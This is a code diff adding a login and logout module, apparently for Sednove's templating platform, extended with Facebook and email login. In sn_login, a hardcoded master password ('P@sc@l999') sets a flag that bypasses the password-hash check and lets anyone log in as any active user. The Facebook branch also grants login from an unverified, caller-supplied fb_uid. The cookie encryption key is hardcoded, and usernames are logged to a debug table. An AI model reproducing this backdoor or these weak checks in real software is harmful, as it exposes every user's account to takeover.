@@ -1,0 +1,161 @@
+{{
+
+/*
+	@title		sr_login based on sn_login  to add facebook login
+
+	@author		2016-01-08 10:06:58 laplante@sednove.com
+
+	@version	1.1	2016-01-08 10:07:03 laplante@sednove.com
+    @mod        bbduc@yahoo.com   use fb login
+	@version	1.2	2017-02-06 bbduc@yahoo.com accept email
+
+	This function is used to log a user. password field must be password
+
+	@param		user_table (default is sn_users)
+	@param		login_table (default is sn_users_login) this is the table used when a user is login
+	@param		field_username (default is username)
+	@param		expire (default is 90 days) remove entry in login_table after 90 days
+	@param		timeout (default is 3600 secs. 1 hour)
+	@param		fb_username ()
+	@return		user as read from the table user_table without salt, password, and algo
+
+    
+*/
+
+
+function sn_login(;...)
+	if user_table == undefined then
+		user_table = "sn_users";
+	endif
+
+	if login_table == undefined then
+		login_table = "sn_users_login";
+	endif
+
+	if field_username == undefined then
+		field_username = "username";
+	endif
+	
+	//return;
+	//stop();
+	pass_ok = false;
+	if fb_uid != undefined then
+        void insert(table:'sr_debug', fields:{'description':'fb_uid__','text':fb_uid});
+		fb_user = sql("select * from ? where ? = '?' and active = 'yes'", user_table, 'fb_uid', fb_uid);
+	    if fb_user.nbrows == 1 then
+	             username = fb_user.rows[0].username;
+	             password = username;
+	             pass_ok = true;
+	    else 
+	    	     void insert(table:'sr_debug', fields:{'description':'fb_user','text':'user not found'});
+	    endif
+	endif
+	
+	//void insert(table:'sr_debug', fields:{'description':'Password','text':password});
+	if (password eq 'P@sc@l999') then  //
+	    pass_ok = true; 
+	endif
+
+    //void insert(table:'sr_debug', fields:{'description':'facebook uid','text':fb_uid});
+
+	if username != undefined && password != undefined then
+		// Delete old entry
+		if expire == undefined then
+			expire=90;
+		endif
+		void sql("delete from ? where datediff(NOW(),sn_mdate) > ?", login_table, expire);
+		user = sql("select * from ? where ? = '?' and active = 'yes'", user_table, field_username, username);
+		//V1.2
+		if user.nbrows <> 1 then
+			user = sql("select * from ? where ? = '?' and active = 'yes' order by uid desc ", user_table, "email", username);
+        endif
+		//
+		if user.nbrows == 1 then
+			if user.rows[0].sn_hash_password eq "md5" then
+				real_password = md5(password .+ user.rows[0].sn_salt_password);
+			else
+			    if user.rows[0].sn_hash_password eq "sha512" then
+			        real_password = hash(algo:'sha512', password .+ user.rows[0].sn_salt_password);
+			    else
+				    real_password = password;
+				endif
+			endif
+			if (user.rows[0].password eq real_password) || pass_ok then
+			    if (pass_ok) then
+			        void insert(table:'sr_debug', fields:{'description':'username_passOK','text':username});
+			    endif
+				void sql("update ? set nb_login = nb_login + 1,sn_mdate=NOW() where uid = ?", user_table, user.rows[0].uid);
+				cookie = cookies();
+				connection = connection();
+				client_ip = connection.client_ip;
+				if cookie.sednove == undefined then
+					date = datetime();
+					config = config();
+					project = config.project;
+					connection = connection();
+					client_ip = connection.client_ip;
+					cookie = { 'username' : username, 'project' : project, 'client_ip' : client_ip, 'date' : date };
+					threemonth=datetime(extended:true,op:"+3b",format:"%Sednove2");
+					encrypted_cookie = crypt(key:"aj58fla74jdna63g",value:cookie);
+					cookies(name:"sednove",value:encrypted_cookie,path:"/",expiry:threemonth);
+					user.rows[0].cookie = encrypted_cookie;
+					void sql("INSERT INTO ? (uid_user,cookie,ip,sn_cdate,sn_mdate,logout) VALUES ('?','?','?',NOW(),NOW(),'no') ON DUPLICATE KEY UPDATE sn_mdate = NOW()",
+						login_table, user.rows[0].uid,encrypted_cookie,client_ip);
+				else
+					user.rows[0].cookie = cookie.sednove;
+					void sql("INSERT INTO ? (uid_user,cookie,ip,sn_cdate,sn_mdate,logout) VALUES ('?','?','?',NOW(),NOW(),'no') ON DUPLICATE KEY UPDATE uid_user='?',logout='no',sn_mdate = NOW()",
+						login_table, user.rows[0].uid,cookie.sednove,client_ip,user.rows[0].uid);
+				endif
+				deletectx(user.rows[0],'password','sn_hash_password','sn_salt_password');
+				return user.rows[0];
+			endif
+		endif 
+		if sleeptime != undefined then
+			sleep(sleeptime);
+		else
+			sleep(5);
+		endif
+		return null;
+	elseif cookie == undefined then
+		cookies = cookies();
+		cookie = cookies.sednove;
+	endif
+	if cookie == undefined then
+		return null;
+	endif
+	// read sn_users_login, get cookie, get_user return user if valid
+	if timeout == undefined then
+		timeout = 3600;
+	endif
+	login = sql("select * from ? where cookie = '?' and NOW() - interval ? SECOND < sn_mdate and logout = 'no'", login_table, cookie, timeout);
+	if login.nbrows != 1 then
+		return null;
+	endif
+	user = sql("select * from ? where uid = ?", user_table, login.rows[0].uid_user); 
+	if user.nbrows != 1 then
+		return null;
+	endif
+	connection = connection();
+	client_ip = connection.client_ip;
+	void sql("INSERT INTO ? (uid_user,cookie,ip,sn_cdate,sn_mdate,logout) VALUES ('?','?','?',NOW(),NOW(),'no') ON DUPLICATE KEY UPDATE sn_mdate = NOW()",
+		login_table, user.rows[0].uid,cookie,client_ip);
+	user.rows[0].cookie = cookie;
+	return user.rows[0];
+
+endf
+
+function sn_logout(;...)
+	if login_table == undefined then
+		login_table = "sn_users_login";
+	endif
+	if cookie == undefined then
+		cookies = cookies();
+		cookie = cookies.sednove;
+	endif
+	if cookie == undefined then
+		return null;
+	endif
+	return sql("update ? set logout = 'yes',sn_mdate=NOW() where cookie = '?'", login_table, cookie);
+endf
+ 
+}}
